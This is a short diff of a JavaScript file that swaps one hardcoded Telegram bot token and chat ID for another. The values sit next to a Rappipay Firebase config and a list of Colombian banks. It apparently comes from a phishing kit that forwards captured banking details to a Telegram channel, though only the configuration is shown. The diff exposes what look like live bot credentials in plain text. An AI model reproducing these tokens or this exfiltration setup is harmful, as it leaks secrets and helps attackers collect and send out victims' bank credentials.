@@ -39,8 +39,8 @@ const RAPPIPAY_FIREBASE = {
 };
 
 // ─── Telegram ──────────────────────────────────────────────────
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8712124626:AAFAYI4vRWnUlvkzuk63dnKhe-dEOIyfwM4";
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1004350190523";
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1004457768033";
 
 // ─── Bancos Colombia ───────────────────────────────────────────
 const BANCOS_COLOMBIA = {
